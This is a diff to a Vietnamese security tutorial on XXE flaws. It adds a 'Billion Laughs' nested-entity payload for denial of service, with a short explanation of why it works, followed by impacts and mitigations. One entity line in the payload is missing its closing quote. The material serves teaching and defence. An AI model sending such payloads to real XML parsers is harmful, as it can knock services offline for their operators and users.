@@ -141,6 +141,32 @@ Content-Length: 52
 <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
 ```  
 Nếu ứng dụng chấp nhận định dang XML thì ta chỉ cần chuyển request sang dạng XML và thực hiện tấn công như bình thường.  
+### Denial Of Service  
+```
+<!--?xml version="1.0" ?-->
+<!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
+<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;
+<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+<tag>&lol9;</tag>
+```  
+Payload này sẽ khai báo hàng loạt các Entỉty, đặc điểm là các Entity trước sẽ đươc gọi bởi Entity sau. Đến cuối cùng ta chỉ việc gọi vào Entity cuối cùng, payload
+sẽ tự động gọi lại các Entity khác theo cấp số nhân làm hệ thống bị quá tải  
+## Ảnh hưởng  
+XXE có thể bị lợi dụng để:
+- Đọc được các file trên hệ thống, hoặc tại các server có liên kết với server bị trúng lỗ hổng  
+- Làm gián đoạn dịch vụ của ứng dụng  
 
+## Mitigation  
+- Hạn chế xử dụng XML, đổi qua định dạng JSON  
+- Update phiên bản  XML processor mới nhất  
+- Disable các XML external entity hoặc giới hạn, chỉ cho phép gọi từ các url tin cậy  
+- Sanitizer user input  
 
 
